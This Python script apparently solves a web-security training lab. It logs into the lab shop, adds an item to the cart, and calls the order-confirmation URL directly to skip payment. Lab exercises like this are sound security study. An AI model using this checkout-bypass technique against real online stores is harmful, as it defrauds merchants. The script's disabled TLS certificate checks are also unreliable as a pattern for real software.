import requests
import re


# Disable certificate warning
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

url = "https://0a0900f603ba113080068af600a300c2.web-security-academy.net"  #change to lab URL
username = "wiener"
password = "peter"

login_session = requests.session()
login_url = url + "/login"
r = login_session.get(login_url,verify=False)
match = re.search(r'name="csrf" value="(.+)">',r.text)
login_csrf_token = match.group(1)
print(f"login csrf token in {login_csrf_token}")

login_data = {"csrf":login_csrf_token,"username":username,"password":password}
r = login_session.post(login_url,verify=False,data=login_data,allow_redirects=False)
print("login success")

cart_data = {"productId":"1","redir":"PRODUCT","quantity":"1"}
r = login_session.post(url+"/cart",verify=False,data=cart_data)
r = login_session.get(url+"/cart/order-confirmation?order-confirmed=true",verify=False)
print("order placed")
